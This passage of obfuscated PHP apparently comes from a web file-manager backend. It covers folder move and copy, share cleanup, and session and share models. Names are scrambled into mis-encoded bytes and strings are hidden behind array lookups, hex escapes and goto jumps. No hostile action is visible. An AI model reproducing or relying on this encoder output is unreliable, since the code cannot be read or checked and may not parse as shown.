$¤Ä×ŒÅ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Œ­Ğé‚, $—Ë”ä´˜, $ç²Æò­ = REPEAT_REPLACE, $ãÆğş = '') { $š×áÒÌ­ =& $_SERVER[Å¶¨Şêº]; $ŸŸ¸ÒÏ· = $this->sourceInfo($Œ­Ğé‚); $ºèù­Ï = $this->sourceInfo($—Ë”ä´˜); if ($ŸŸ¸ÒÏ·[$š×áÒÌ­[441]] == $ºèù­Ï[$š×áÒÌ­[411]]) { if ($ŸŸ¸ÒÏ·[$š×áÒÌ­[440]] == $š×áÒÌ­[99]) { Model($š×áÒÌ­[438])->restore(array($Œ­Ğé‚)); } if (!$ãÆğş || $ãÆğş == $ŸŸ¸ÒÏ·[$š×áÒÌ­[42]]) { return $Œ­Ğé‚; } } $ëÕŞ•×Ğ = $this->pathInfoMore($Œ­Ğé‚); if ($this->isParentOf($Œ­Ğé‚, $—Ë”ä´˜)) { return !1; } if (!$ŸŸ¸ÒÏ· || !$ºèù­Ï || $ºèù­Ï[$š×áÒÌ­[419]] != $š×áÒÌ­[99]) { return !1; } Hook::trigger($š×áÒÌ­[595], $ëÕŞ•×Ğ); $this->targetIsDelete = intval($ŸŸ¸ÒÏ·[$š×áÒÌ­[440]]); if ($ŸŸ¸ÒÏ·[$š×áÒÌ­[441]] == $—Ë”ä´˜ && $ãÆğş != $ŸŸ¸ÒÏ·[$š×áÒÌ­[42]]) { $²°Óó• = $this->fileNameExist($—Ë”ä´˜, $ãÆğş); if ($²°Óó• && $ŸŸ¸ÒÏ·[$š×áÒÌ­[419]] == $š×áÒÌ­[209]) { $¡‰¯®Ô = $this->sourceInfo($²°Óó•); $†·æ¯µ = $this->fileHistory($¡‰¯®Ô, $ŸŸ¸ÒÏ·[$š×áÒÌ­[477]], $ŸŸ¸ÒÏ·[$š×áÒÌ­[87]]); if (!$†·æ¯µ) { Model($š×áÒÌ­[480])->remove($ŸŸ¸ÒÏ·[$š×áÒÌ­[477]]); } $this->removeNow($Œ­Ğé‚, !1); $this->folderSizeReset($—Ë”ä´˜); Hook::trigger($š×áÒÌ­[596], $ëÕŞ•×Ğ); return $²°Óó•; } } $¦Ñ¦‘ıµ = $ãÆğş ? $ãÆğş : $ŸŸ¸ÒÏ·[$š×áÒÌ­[42]]; $this->lockMoveStart($Œ­Ğé‚); $this->lockWriteStart($—Ë”ä´˜, $¦Ñ¦‘ıµ); $“¿Â¨Ü = array($š×áÒÌ­[566] => array(), $š×áÒÌ­[597] => !1); $this->clearShare($Œ­Ğé‚, $—Ë”ä´˜); $ñˆŞñø¸ = $this->fileNameExistCache($—Ë”ä´˜, $ŸŸ¸ÒÏ·[$š×áÒÌ­[42]]); $Ì±ƒ¼Ç = $this->_move($Œ­Ğé‚, $—Ë”ä´˜, $ç²Æò­, $“¿Â¨Ü, $ãÆğş); $this->sourceCacheClear(); if ($ŸŸ¸ÒÏ·[$š×áÒÌ­[419]] == $š×áÒÌ­[99] && $ñˆŞñø¸) { $this->folderSizeResetChildren($Ì±ƒ¼Ç); } Model($š×áÒÌ­[211])->linkAdd($“¿Â¨Ü[$š×áÒÌ­[566]]); if ($ñˆŞñø¸ && $“¿Â¨Ü[$š×áÒÌ­[597]]) { $this->removeNow($Œ­Ğé‚, !1); } $this->lockMoveEnd($Œ­Ğé‚); $this->lockWriteEnd($—Ë”ä´˜, $¦Ñ¦‘ıµ); $this->folderSizeReset($ŸŸ¸ÒÏ·[$š×áÒÌ­[441]]); $this->folderSizeReset($—Ë”ä´˜); $©šşÌ… = array($ŸŸ¸ÒÏ·[$š×áÒÌ­[441]], $—Ë”ä´˜); if ($ŸŸ¸ÒÏ·[$š×áÒÌ­[419]] == $š×áÒÌ­[99]) { $©šşÌ…[] = $Œ­Ğé‚; } $this->updateModifyTime($©šşÌ…); Model($š×áÒÌ­[570])->eventMove($Œ­Ğé‚, $ŸŸ¸ÒÏ·[$š×áÒÌ­[441]], $—Ë”ä´˜); Hook::trigger($š×áÒÌ­[596], $ëÕŞ•×Ğ); return $Ì±ƒ¼Ç; } private function _move($ÄŞôÖ¸ó, $‡¢Š’ÄÔ, $ÑÚ„îæÜ, &$ÊÏØğÜ, $Å½¸¡Š× = '') { $ÇŠÄ ù =& $_SERVER[Å¶¨Şêº]; $§àİ…ï¿ = $this->sourceInfo($ÄŞôÖ¸ó); $²©şé¯€ = $§àİ…ï¿[$ÇŠÄ ù[419]] == $ÇŠÄ ù[99]; $ÃìĞŠ× = $Å½¸¡Š× ? $Å½¸¡Š× : $§àİ…ï¿[$ÇŠÄ ù[42]]; $ßÍ¦ÈÜø = $this->fileNameExistCache($‡¢Š’ÄÔ, $ÃìĞŠ×); $this->lockMoveStart($ÄŞôÖ¸ó); $this->lockWriteStart($‡¢Š’ÄÔ, $ÃìĞŠ×); if (!$ßÍ¦ÈÜø) { return $this->_moveForce($ÄŞôÖ¸ó, $‡¢Š’ÄÔ, $ÃìĞŠ×); } $¶”Øô¿— = $ßÍ¦ÈÜø; $…’Ëß = !1; if ($²©şé¯€) { if ($ÑÚ„îæÜ == REPEAT_RENAME_FOLDER) { $ÃìĞŠ× = $this->fileNameAuto($‡¢Š’ÄÔ, $ÃìĞŠ×, $ÑÚ„îæÜ, $²©şé¯€); $¶”Øô¿— = $this->_moveForce($ÄŞôÖ¸ó, $‡¢Š’ÄÔ, $ÃìĞŠ×); } else { if ($ÑÚ„îæÜ == REPEAT_RENAME_FOLDER) { $ÑÚ„îæÜ = REPEAT_RENAME; } $…±ğ²á = $this->_childrenListSelect($ÄŞôÖ¸ó); foreach ($…±ğ²á as $ÂçÈ§™²) { $this->_move($ÂçÈ§™²[$ÇŠÄ ù[411]], $ßÍ¦ÈÜø, $ÑÚ„îæÜ, $ÊÏØğÜ); } $…’Ëß = !0; } } else { if ($ÑÚ„îæÜ == REPEAT_SKIP) { $…’Ëß = !0; } else { if ($ÑÚ„îæÜ == REPEAT_RENAME || $ÑÚ„îæÜ == REPEAT_RENAME_FOLDER) { $ÃìĞŠ× = $this->fileNameAuto($‡¢Š’ÄÔ, $ÃìĞŠ×, $ÑÚ„îæÜ, $²©şé¯€); $¶”Øô¿— = $this->_moveForce($ÄŞôÖ¸ó, $‡¢Š’ÄÔ, $ÃìĞŠ×); } else { if ($ÑÚ„îæÜ == REPEAT_REPLACE) { $±¶÷€‘ = $this->sourceInfoCache($ßÍ¦ÈÜø); $ì¦Éöâ = $this->fileHistory($±¶÷€‘, $§àİ…ï¿[$ÇŠÄ ù[477]], $§àİ…ï¿[$ÇŠÄ ù[87]]); $…’Ëß = !0; if ($ì¦Éöâ) { $ÊÏØğÜ[$ÇŠÄ ù[566]][] = $§àİ…ï¿[$ÇŠÄ ù[477]]; } } } } } if ($…’Ëß && !$ÊÏØğÜ[$ÇŠÄ ù[597]]) { $ÊÏØğÜ[$ÇŠÄ ù[597]] = !0; } return $¶”Øô¿—; } private function _moveForce($¦äÆÚ³ï, $„¦ÙÃÚ¦, $Ï³ê´»Ê) { $ûöˆ©ÊÊ =& $_SERVER[Å¶¨Şêº]; $ƒ¤¸¯ = $this->sourceInfo($¦äÆÚ³ï); $õã¼ÂÄÅ = $this->sourceInfo($„¦ÙÃÚ¦); $…°µèÃ = $ƒ¤¸¯[$ûöˆ©ÊÊ[419]] == $ûöˆ©ÊÊ[99]; $ÀİÜÛÅ = array($ûöˆ©ÊÊ[410] => $õã¼ÂÄÅ[$ûöˆ©ÊÊ[411]], $ûöˆ©ÊÊ[589] => $õã¼ÂÄÅ[$ûöˆ©ÊÊ[520]] . $õã¼ÂÄÅ[$ûöˆ©ÊÊ[411]] . $ûöˆ©ÊÊ[60], $ûöˆ©ÊÊ[585] => $õã¼ÂÄÅ[$ûöˆ©ÊÊ[420]], $ûöˆ©ÊÊ[586] => $õã¼ÂÄÅ[$ûöˆ©ÊÊ[505]], $ûöˆ©ÊÊ[588] => USER_ID, $ûöˆ©ÊÊ[429] => $Ï³ê´»Ê); $æ‘š§–Ç = $ƒ¤¸¯[$ûöˆ©ÊÊ[420]] == SourceModel::TYPE_GROUP && $õã¼ÂÄÅ[$ûöˆ©ÊÊ[420]] == SourceModel::TYPE_GROUP && $ƒ¤¸¯[$ûöˆ©ÊÊ[505]] == $õã¼ÂÄÅ[$ûöˆ©ÊÊ[505]]; if (!$æ‘š§–Ç && $this->moveClearAuth) { Model($ûöˆ©ÊÊ[502])->authClear($¦äÆÚ³ï); } $²æ‰ùŠ  = $ƒ¤¸¯[$ûöˆ©ÊÊ[440]] == $ûöˆ©ÊÊ[99] && $õã¼ÂÄÅ[$ûöˆ©ÊÊ[440]] != $ûöˆ©ÊÊ[99]; if ($²æ‰ùŠ ) { $ÀİÜÛÅ[$ûöˆ©ÊÊ[439]] = 0; } if ($…°µèÃ) { $¬äàÉ¢‡ = array($ûöˆ©ÊÊ[589] => array($ûöˆ©ÊÊ[549], $ƒ¤¸¯[$ûöˆ©ÊÊ[520]] . $ƒ¤¸¯[$ûöˆ©ÊÊ[411]] . $ûöˆ©ÊÊ[550])); $‘Ğ¸İ–ı = $ƒ¤¸¯[$ûöˆ©ÊÊ[520]] . $ƒ¤¸¯[$ûöˆ©ÊÊ[411]] . $ûöˆ©ÊÊ[60]; $‡‚Åşïé = $õã¼ÂÄÅ[$ûöˆ©ÊÊ[520]] . $õã¼ÂÄÅ[$ûöˆ©ÊÊ[411]] . $ûöˆ©ÊÊ[60] . $ƒ¤¸¯[$ûöˆ©ÊÊ[411]] . $ûöˆ©ÊÊ[60]; $…”ñ˜ = array($ûöˆ©ÊÊ[589] => array($ûöˆ©ÊÊ[598], "\162\x65\160\x6c\x61\x63\x65\50\160\141\x72\x65\x6e\164\114\145\166\145\154\x2c\47{$‘Ğ¸İ–ı}\47\x2c\47{$‡‚Åşïé}\x27\51"), $ûöˆ©ÊÊ[585] => $õã¼ÂÄÅ[$ûöˆ©ÊÊ[420]], $ûöˆ©ÊÊ[586] => $õã¼ÂÄÅ[$ûöˆ©ÊÊ[505]]); if ($²æ‰ùŠ ) { $…”ñ˜[$ûöˆ©ÊÊ[439]] = 0; } $this->where($¬äàÉ¢‡)->data($…”ñ˜)->save(); } $this->where(array($ûöˆ©ÊÊ[426] => $¦äÆÚ³ï))->data($ÀİÜÛÅ)->save(); return $¦äÆÚ³ï; } private function clearShare($¹ªµó«Ş, $ˆÓæäìí) { $ÆÄºş ˆ =& $_SERVER[Å¶¨Şêº]; $ƒÉ½©Ç… = $this->sourceInfo($¹ªµó«Ş); $ŸóÑ†ñ— = $this->sourceInfo($ˆÓæäìí); if ($ƒÉ½©Ç…[$ÆÄºş ˆ[505]] == $ŸóÑ†ñ—[$ÆÄºş ˆ[505]] && $ƒÉ½©Ç…[$ÆÄºş ˆ[420]] == $ÆÄºş ˆ[599]) { return; } $¶ÓŞãİÈ = array($ÆÄºş ˆ[520] => array($ÆÄºş ˆ[549], $ƒÉ½©Ç…[$ÆÄºş ˆ[520]] . $¹ªµó«Ş . $ÆÄºş ˆ[550])); $êÈ¿ÀÎş = $this->field($ÆÄºş ˆ[426])->where($¶ÓŞãİÈ)->getField($ÆÄºş ˆ[411], !0); if (!$êÈ¿ÀÎş) { return; } $¶ÓŞãİÈ = array($ÆÄºş ˆ[411] => array($ÆÄºş ˆ[7], $êÈ¿ÀÎş), $ÆÄºş ˆ[600] => 1); $±øË¨ÇÆ = Model($ÆÄºş ˆ[601])->field($ÆÄºş ˆ[602])->where($¶ÓŞãİÈ)->select(); if (!$±øË¨ÇÆ) { return; } $±øË¨ÇÆ = array_to_keyvalue($±øË¨ÇÆ, $ÆÄºş ˆ[12], $ÆÄºş ˆ[602]); $¶ÓŞãİÈ = array($ÆÄºş ˆ[602] => array($ÆÄºş ˆ[7], $±øË¨ÇÆ)); Model($ÆÄºş ˆ[601])->where($¶ÓŞãİÈ)->save(array($ÆÄºş ˆ[600] => 0)); Model($ÆÄºş ˆ[603])->where($¶ÓŞãİÈ)->delete(); } public function copyFolderFromIO($Øèæ¶¤Ó, $óƒù¦‰¢, $ö½ÑÅ´¥, $„ıúõœñ, $øæõµ·ƒ, $Ñ†ì©ñÌ = false) { $Š‘âšªâ =& $_SERVER[Å¶¨Şêº]; $„ÏˆªÑ‚ = array($Š‘âšªâ[567] => array(), $Š‘âšªâ[568] => array(), $Š‘âšªâ[566] => array(), $Š‘âšªâ[604] => array()); $‡Çšû±ş = $Ñ†ì©ñÌ ? $Ñ†ì©ñÌ : $Øèæ¶¤Ó->pathThis($óƒù¦‰¢); $·û³ôñš = $this->fileNameExist($ö½ÑÅ´¥, $‡Çšû±ş); $•ÒËı¢Â = $this->mkdir($ö½ÑÅ´¥, $‡Çšû±ş, $„ıúõœñ); if (!$·û³ôñš || $„ıúõœñ == REPEAT_RENAME_FOLDER) { $„ıúõœñ = !1; } if ($·û³ôñš) { $this->_childrenAllMake($·û³ôñš); } Hook::trigger($Š‘âšªâ[605]); $this->_copyChildTo($Øèæ¶¤Ó, $óƒù¦‰¢, $•ÒËı¢Â, $„ıúõœñ, $„ÏˆªÑ‚, $øæõµ·ƒ); Hook::trigger($Š‘âšªâ[606]); if ($•ÒËı¢Â) { $this->folderSizeResetChildren($•ÒËı¢Â); } $this->_childrenListClear(); Model($Š‘âšªâ[569])->addAll($„ÏˆªÑ‚[$Š‘âšªâ[567]], array(), !0); Model($Š‘âšªâ[570])->eventCopy($•ÒËı¢Â); $this->saveAll($„ÏˆªÑ‚[$Š‘âšªâ[568]]); Model($Š‘âšªâ[480])->linkAdd($„ÏˆªÑ‚[$Š‘âšªâ[566]]); Model($Š‘âšªâ[480])->remove($„ÏˆªÑ‚[$Š‘âšªâ[604]]); $this->folderSizeReset($ö½ÑÅ´¥); $this->updateModifyTime($ö½ÑÅ´¥); return $•ÒËı¢Â; } private function _copyChildTo($àÎÀååÉ, $ëİ²×Ìæ, $“ÈŞşõ, $ÑšööØ, &$Æ²±‰Ö, $º’úÓÍ­) { $ìÈÏ¶ä£ =& $_SERVER[Å¶¨Şêº]; $öúàş™Ş = $this->sourceInfoCache($“ÈŞşõ); $¯şİ¸€Ï = $àÎÀååÉ->listPath($ëİ²×Ìæ); $¯şİ¸€Ï = $¯şİ¸€Ï ? $¯şİ¸€Ï : array($ìÈÏ¶ä£[94] => array(), $ìÈÏ¶ä£[93] => array()); $¦Ë‰İí = array_merge($¯şİ¸€Ï[$ìÈÏ¶ä£[94]], $¯şİ¸€Ï[$ìÈÏ¶ä£[93]]); $åÌÁ¼Ø = $this->_addFiles($àÎÀååÉ, $¯şİ¸€Ï[$ìÈÏ¶ä£[94]], $º’úÓÍ­); $²ıë®‚­ = array(); foreach ($¦Ë‰İí as &$Ø…òûè¬) { if (isset($åÌÁ¼Ø[$Ø…òûè¬[$ìÈÏ¶ä£[42]]])) { $Ø…òûè¬ = $åÌÁ¼Ø[$Ø…òûè¬[$ìÈÏ¶ä£[42]]]; } $Ø…òûè¬[$ìÈÏ¶ä£[419]] = $Ø…òûè¬[$ìÈÏ¶ä£[43]] == $ìÈÏ¶ä£[86]; $Ø…òûè¬[$ìÈÏ¶ä£[421]] = substr(_get($Ø…òûè¬, $ìÈÏ¶ä£[185], $ìÈÏ¶ä£[12]), 0, 10); $Ø…òûè¬[$ìÈÏ¶ä£[87]] = _get($Ø…òûè¬, $ìÈÏ¶ä£[87], 0); $Ø…òûè¬[$ìÈÏ¶ä£[477]] = _get($Ø…òûè¬, $ìÈÏ¶ä£[477], 0); if (!isset($Ø…òûè¬[$ìÈÏ¶ä£[607]]) && $Ø…òûè¬[$ìÈÏ¶ä£[477]]) { $Æ²±‰Ö[$ìÈÏ¶ä£[604]][] = $Ø…òûè¬[$ìÈÏ¶ä£[477]]; } if ($ÑšööØ) { $´‚—Ş÷ = $this->fileNameExistCache($“ÈŞşõ, $Ø…òûè¬[$ìÈÏ¶ä£[42]]); if ($´‚—Ş÷) { if ($Ø…òûè¬[$ìÈÏ¶ä£[419]] || $ÑšööØ == REPEAT_SKIP) { continue; } if ($ÑšööØ == REPEAT_REPLACE) { $½ŠÜ¡úô = $this->sourceInfoCache($´‚—Ş÷); $æûˆäûŞ = $this->fileHistory($½ŠÜ¡úô, $Ø…òûè¬[$ìÈÏ¶ä£[477]], $Ø…òûè¬[$ìÈÏ¶ä£[87]]); if ($æûˆäûŞ) { $Æ²±‰Ö[$ìÈÏ¶ä£[566]][] = $Ø…òûè¬[$ìÈÏ¶ä£[477]]; } continue; } else { if ($ÑšööØ == REPEAT_RENAME) { $Ø…òûè¬[$ìÈÏ¶ä£[42]] = $this->fileNameAutoCache($“ÈŞşõ, $Ø…òûè¬[$ìÈÏ¶ä£[42]], $ÑšööØ, !1); } } } } if (!$Ø…òûè¬[$ìÈÏ¶ä£[419]] && $Ø…òûè¬[$ìÈÏ¶ä£[477]] == 0) { continue; } if (!$Ø…òûè¬[$ìÈÏ¶ä£[419]] && $Ø…òûè¬[$ìÈÏ¶ä£[477]]) { $Æ²±‰Ö[$ìÈÏ¶ä£[566]][] = $Ø…òûè¬[$ìÈÏ¶ä£[477]]; } $²ıë®‚­[] = $this->_makeItemData($Ø…òûè¬, $öúàş™Ş, $Ø…òûè¬[$ìÈÏ¶ä£[42]]); } unset($Ø…òûè¬); if (!empty($²ıë®‚­)) { $this->addAll($²ıë®‚­); $this->_childrenListSelect($“ÈŞşõ); } $àå†èŠî = $this->_childrenList($“ÈŞşõ); $àå†èŠî = array_to_keyvalue($àå†èŠî, $ìÈÏ¶ä£[42]); foreach ($¦Ë‰İí as $Ø…òûè¬) { $½ŠÜ¡úô = $àå†èŠî[$Ø…òûè¬[$ìÈÏ¶ä£[42]]]; $šü®ì«³ = $½ŠÜ¡úô[$ìÈÏ¶ä£[411]]; $this->_copyApplyMeta($½ŠÜ¡úô, $Æ²±‰Ö); if ($Ø…òûè¬[$ìÈÏ¶ä£[43]] == $ìÈÏ¶ä£[86]) { $Ø…òûè¬[$ìÈÏ¶ä£[95]] = $àÎÀååÉ->getPathInner($Ø…òûè¬[$ìÈÏ¶ä£[95]]); $this->_copyChildTo($àÎÀååÉ, $Ø…òûè¬[$ìÈÏ¶ä£[95]], $šü®ì«³, $ÑšööØ, $Æ²±‰Ö, $º’úÓÍ­); } } } private function _addFiles($ÅÇ×çÃú, $›€óöà’, $·«êàı«) { $é’µï´ =& $_SERVER[Å¶¨Şêº]; if (!$›€óöà’ || count($›€óöà’) == 0) { return array(); } $†¦°¦† = array(); foreach ($›€óöà’ as &$©Â´•”Á) { Hook::trigger($é’µï´[608], $©Â´•”Á); $©Â´•”Á[$é’µï´[95]] = $ÅÇ×çÃú->getPathInner($©Â´•”Á[$é’µï´[95]]); $ê®†í = $ÅÇ×çÃú->hashSimple($©Â´•”Á[$é’µï´[95]]); $ÄËíğ£¸ = $ÅÇ×çÃú->hashMd5($©Â´•”Á[$é’µï´[95]]); if (strlen($ÄËíğ£¸) > 10 && !isset($†¦°¦†[$ÄËíğ£¸])) { $†¦°¦†[$ÄËíğ£¸] = array(); } $©Â´•”Á[$é’µï´[188]] = $ê®†í; $©Â´•”Á[$é’µï´[187]] = $ÄËíğ£¸; $†¦°¦†[$ÄËíğ£¸][] =& $©Â´•”Á; if (count($†¦°¦†[$ÄËíğ£¸]) > 1) { $©Â´•”Á[$é’µï´[607]] = !0; } Hook::trigger($é’µï´[609], $©Â´•”Á); } unset($©Â´•”Á); $õÓìøÔ™ = array($é’µï´[187] => array($é’µï´[7], array_keys($†¦°¦†))); $»¢¡¶ŠŸ = Model($é’µï´[610]); $ä Èù€ø = $»¢¡¶ŠŸ->where($õÓìøÔ™)->select(); $ä Èù€ø = $ä Èù€ø ? $ä Èù€ø : array(); foreach ($ä Èù€ø as $œ€éˆÅ) { if (!isset($†¦°¦†[$œ€éˆÅ[$é’µï´[187]]])) { continue; } $³í´êİ = $†¦°¦†[$œ€éˆÅ[$é’µï´[187]]]; foreach ($³í´êİ as &$©Â´•”Á) { $©Â´•”Á[$é’µï´[477]] = $œ€éˆÅ[$é’µï´[477]]; $©Â´•”Á[$é’µï´[607]] = !0; } unset($©Â´•”Á); } $ÌÛéìì = array(); foreach ($›€óöà’ as $·½›í‡½) { Hook::trigger($é’µï´[611], $·½›í‡½); if (isset($·½›í‡½[$é’µï´[607]]) && $·½›í‡½[$é’µï´[607]]) { Hook::trigger($é’µï´[612], $·½›í‡½); continue; } $œëÚè = $ÅÇ×çÃú->getPathInner($·½›í‡½[$é’µï´[95]]); $Ï¾¨×“ = $»¢¡¶ŠŸ->addFileMake($œëÚè, $·½›í‡½[$é’µï´[87]], $·½›í‡½[$é’µï´[188]], $·½›í‡½[$é’µï´[187]], $·½›í‡½[$é’µï´[42]], $·«êàı«); Hook::trigger($é’µï´[612], $·½›í‡½); if (!is_array($Ï¾¨×“)) { continue; } $ÌÛéìì[] = $Ï¾¨×“; } $»¢¡¶ŠŸ->addAll($ÌÛéìì); $õÓìøÔ™ = array($é’µï´[187] => array($é’µï´[7], array_keys($†¦°¦†))); $ä Èù€ø = $»¢¡¶ŠŸ->where($õÓìøÔ™)->select(); $ä Èù€ø = $ä Èù€ø ? $ä Èù€ø : array(); foreach ($ä Èù€ø as $œ€éˆÅ) { if (!isset($†¦°¦†[$œ€éˆÅ[$é’µï´[187]]])) { continue; } $âûùâö =& $†¦°¦†[$œ€éˆÅ[$é’µï´[187]]]; foreach ($âûùâö as &$©Â´•”Á) { $©Â´•”Á[$é’µï´[477]] = $œ€éˆÅ[$é’µï´[477]]; } unset($©Â´•”Á); } $çŠßñĞç = array(); foreach ($›€óöà’ as $İıäİâ“) { $çŠßñĞç[$İıäİâ“[$é’µï´[42]]] = $İıäİâ“; } return $çŠßñĞç; } } define($_SERVER[Å¶¨Şêº][613], $_SERVER[Å¶¨Şêº][614]); $ykbapqicrj = $_SERVER[Å¶¨Şêº][615]; goto c‚¼»İ‡îÜ; cã§¨ŞšÂƒ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\137\x73\145\163\163\x69\157\x6e"; public function get($á×±¹ôò) { $ıÏìûÓ« =& $_SERVER[Å¶¨Şêº]; $Â´áŞ°à = $this->where(array($ıÏìûÓ«[1987] => $á×±¹ôò))->find(); if (!is_array($Â´áŞ°à)) { return !1; } return $Â´áŞ°à[$ıÏìûÓ«[752]]; } public function set($şÂ³Ñ, $¬…‰…•õ, $óøËëÃ¶ = 3600) { $—¼¥›Ì¤ =& $_SERVER[Å¶¨Şêº]; $ûù¢æ®Â = array($—¼¥›Ì¤[1987] => $şÂ³Ñ, $—¼¥›Ì¤[1891] => $¬…‰…•õ, $—¼¥›Ì¤[1988] => $óøËëÃ¶ + time()); if (Session::get($—¼¥›Ì¤[1989])) { $ûù¢æ®Â[$—¼¥›Ì¤[1663]] = Session::get($—¼¥›Ì¤[1989]); } else { $ûù¢æ®Â[$—¼¥›Ì¤[1663]] = 0; } if ($this->get($şÂ³Ñ)) { return $this->where(array($—¼¥›Ì¤[1987] => $şÂ³Ñ))->save($ûù¢æ®Â); } else { return $this->add($ûù¢æ®Â, array(), !0); } } public function remove($öÅ½ «¼) { return $this->where(array($_SERVER[Å¶¨Şêº][1987] => $öÅ½ «¼))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Å¶¨Şêº][1990] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\151\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\x72\164\x2c\165\160\144\141\x74\145", "\146\165\x6e\143\164\x69\157\x6e"), array("\143\x72\145\141\x74\145\124\x69\155\145", "\164\x69\x6d\145", "\x69\156\163\145\162\x74", "\x66\x75\x6e\x63\164\x69\157\156"), array("\157\x70\164\x69\x6f\x6e\163", '', "\x69\x6e\163\x65\162\x74\x2c\x75\160\144\141\164\x65\x2c\163\145\154\x65\x63\164", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ô‰ÇÑ­ü) { $éòš’Ÿ =& $_SERVER[Å¶¨Şêº]; $êîó¯´ = isset($Ô‰ÇÑ­ü[0]) ? $Ô‰ÇÑ­ü[0] : !1; return array($éòš’Ÿ[1991] => array(USER_ID, $éòš’Ÿ[1992]), $éòš’Ÿ[1932] => array($êîó¯´, $éòš’Ÿ[1993])); } protected function listSimple() { $ ¨„ìÁ = array($_SERVER[Å¶¨Şêº][1663] => USER_ID); $é‚¨ù‚ = $this->field($this->fieldList)->where($ ¨„ìÁ)->select(); return $é‚¨ù‚ ? $é‚¨ù‚ : array(); } protected function getInfo($­£ÑĞ“Ğ, $äõ÷€º = false) { $¡¦Â¢ß =& $_SERVER[Å¶¨Şêº]; if ($äõ÷€º) { return $this->_getShareInfo(array($¡¦Â¢ß[602] => $­£ÑĞ“Ğ)); } $™÷“öß‡ = $this->cacheFunctionGet($¡¦Â¢ß[1934], $­£ÑĞ“Ğ); return $™÷“öß‡; } public function getInfoByHash($ñ”Ëä¥) { return $this->_getShareInfo(array($_SERVER[Å¶¨Şêº][1994] => $ñ”Ëä¥)); } public function getInfoByPath($“êâÆá) { $üÜ©É÷Ü =& $_SERVER[Å¶¨Şêº]; $ÁÊ‡¹˜è = array($üÜ©É÷Ü[1663] => USER_ID, $üÜ©É÷Ü[411] => $“êâÆá); return $this->_getShareInfo($ÁÊ‡¹˜è); } public function getInfoBySourcePath($Â¯¯¥ƒ­) { $ÒÂ”‰Ì =& $_SERVER[Å¶¨Şêº]; $¨¹©–ã¢ = array($ÒÂ”‰Ì[1663] => USER_ID, $ÒÂ”‰Ì[1172] => $Â¯¯¥ƒ­); return $this->_getShareInfo($¨¹©–ã¢); } private function _getShareInfo($ÁÃ‡ğ¶Å) { $ÙÑÊÚ» =& $_SERVER[Å¶¨Şêº]; $†ş”ìÊå = $this->where($ÁÃ‡ğ¶Å)->find(); if (!$†ş”ìÊå) { return !1; } $ÁÃ‡ğ¶Å = array($ÙÑÊÚ»[602] => $†ş”ìÊå[$ÙÑÊÚ»[602]]); $ëêß‘ÇÈ = $ÙÑÊÚ»[1995]; $ğÆ“Ç¬é = Model($ÙÑÊÚ»[603])->order($ÙÑÊÚ»[408])->field($ëêß‘ÇÈ)->where($ÁÃ‡ğ¶Å)->select(); if ($†ş”ìÊå[$ÙÑÊÚ»[411]] == $ÙÑÊÚ»[209]) { $†ş”ìÊå[$ÙÑÊÚ»[98]] = IO::info($†ş”ìÊå[$ÙÑÊÚ»[1172]]); } else { $†ş”ìÊå[$ÙÑÊÚ»[98]] = Model($ÙÑÊÚ»[1337])->pathInfo($†ş”ìÊå[$ÙÑÊÚ»[411]]); } $†ş”ìÊå[$ÙÑÊÚ»[1996]] = $ğÆ“Ç¬é; return $†ş”ìÊå; } protected function getInfoAuth($ÈÂ²ÚŞ´) { $à¾Í„à =& $_SERVER[Å¶¨Şêº]; $¯úûøß÷ = $this->getInfo($ÈÂ²ÚŞ´); if ($¯úûøß÷[$à¾Í„à[1663]] == USER_ID) { $¯úûøß÷[$à¾Í„à[422]] = $¯úûøß÷[$à¾Í„à[98]][$à¾Í„à[422]]; } else { $¯úûøß÷[$à¾Í„à[422]] = Model($à¾Í„à[502])->authMake($¯úûøß÷[$à¾Í„à[1996]]); } return $¯úûøß÷; } protected function listData($ÉÇ©îÍ® = null, $§¹èèËè = 300) { $±ªõ‚Å™ =& $_SERVER[Å¶¨Şêº]; $£ñ†¤® = array(array($±ªõ‚Å™[497] => array($±ªõ‚Å™[1009], 0), $±ªõ‚Å™[600] => array($±ªõ‚Å™[1009], 0), $±ªõ‚Å™[1997] => $±ªõ‚Å™[1950])); if ($ÉÇ©îÍ® == $±ªõ‚Å™[1998]) { $£ñ†¤® = array($±ªõ‚Å™[497] => 1); } else { if ($ÉÇ©îÍ® == $±ªõ‚Å™[1158]) { $£ñ†¤® = array($±ªõ‚Å™[600] => 1); } } $£ñ†¤®[$±ªõ‚Å™[1663]] = USER_ID; $Ìü¯É˜Ü = $this->where($£ñ†¤®)->selectPage($§¹èèËè); return $Ìü¯É˜Ü; } protected function listToMe($ŒºŞõƒ = 300) { $è¯„ÛÜë =& $_SERVER[Å¶¨Şêº]; $à©³¤ÇÖ = Model($è¯„ÛÜë[1999])->userGroupParents(USER_ID); $áóˆô¶õ = array($è¯„ÛÜë[585] => SourceModel::TYPE_USER, $è¯„ÛÜë[505] => USER_ID); if ($à©³¤ÇÖ) { $áóˆô¶õ = array(array($è¯„ÛÜë[585] => SourceModel::TYPE_USER, $è¯„ÛÜë[505] => USER_ID), array($è¯„ÛÜë[585] => SourceModel::TYPE_GROUP, $è¯„ÛÜë[505] => array($è¯„ÛÜë[7], $à©³¤ÇÖ)), $è¯„ÛÜë[1997] => $è¯„ÛÜë[1950]); } $—è÷¦€¼ = Model($è¯„ÛÜë[603])->where($áóˆô¶õ)->selectPage($ŒºŞõƒ); $£¼ù–‰Ü = array_to_keyvalue_group($—è÷¦€¼[$è¯„ÛÜë[379]], $è¯„ÛÜë[602]); if (!$£¼ù–‰Ü) { return $—è÷¦€¼; } $û“û´Ù‘ = $è¯„ÛÜë[2000]; $áóˆô¶õ = array($è¯„ÛÜë[602] => array($è¯„ÛÜë[427], array_keys($£¼ù–‰Ü)), $è¯„ÛÜë[1663] => array($è¯„ÛÜë[1011], $è¯„ÛÜë[209])); $—É›Î›™ = $this->field($û“û´Ù‘)->where($áóˆô¶õ)->select(); foreach ($—É›Î›™ as $†ä³ä–é => &$Äôüâ‚) { $Äôüâ‚[$è¯„ÛÜë[1996]] = $£¼ù–‰Ü[$Äôüâ‚[$è¯„ÛÜë[602]]]; } 